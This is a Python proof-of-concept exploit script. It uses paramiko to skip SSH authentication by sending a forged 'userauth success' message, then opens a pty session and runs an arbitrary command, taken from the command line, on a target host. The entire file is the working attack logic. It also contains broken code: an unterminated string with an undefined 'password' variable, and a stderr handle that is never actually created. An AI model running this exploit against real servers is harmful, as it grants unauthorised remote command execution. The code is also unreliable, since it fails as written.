import logging
import sys
import socket
import time

import paramiko


logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048


def execute(hostname, port, command):
    sock = socket.socket()
    try:
        sock.connect((hostname, int(port)))
        transport = paramiko.transport.Transport(sock)
        transport.set_hexdump(True)
        transport.start_client()

        m = paramiko.message.Message()
        m.add_byte(paramiko.common.cMSG_SERVICE_REQUEST)
        m.add_string("ssh-userauth")
        transport._send_message(m)

        # Send userauth success
        message = paramiko.message.Message()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
        transport._auth_trigger()
        time.sleep(0.5)
        
        # Open a session
        client = transport.open_session(timeout=10)
        time.sleep(0.5)

        # Request pty
        m = paramiko.message.Message()
        m.add_byte(paramiko.common.cMSG_CHANNEL_REQUEST)
        m.add_int(0)
        m.add_string("pty-req")
        m.add_boolean(True)
        m.add_string('vt100')
        m.add_int(80)
        m.add_int(24)
        m.add_int(0)
        m.add_int(0)
        m.add_string(bytes())
        transport._send_message(m)
        time.sleep(3)

        # Pass creds and commands. For whatever reason it likes them to be exec
        client.exec_command('admin\n')
        time.sleep(0.5)
        client.exec_command(password\n')
        client.exec_command('\n')
        client.exec_command(command + '\n')
        client.exec_command(command + '\n')
        client.exec_command(command + '\n') # it'll eventually spit out the response. this client script is wonky.

        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile
        output = stdout.read()
        error = stderr.read()
        stdout.close()
        stderr.close()

        return (output+error).decode()
    except:
        logging.debug("Unable to connect.")

    return None


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print('Usage: python poc.py <target ip> <port> <command>')
        exit(0)
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))

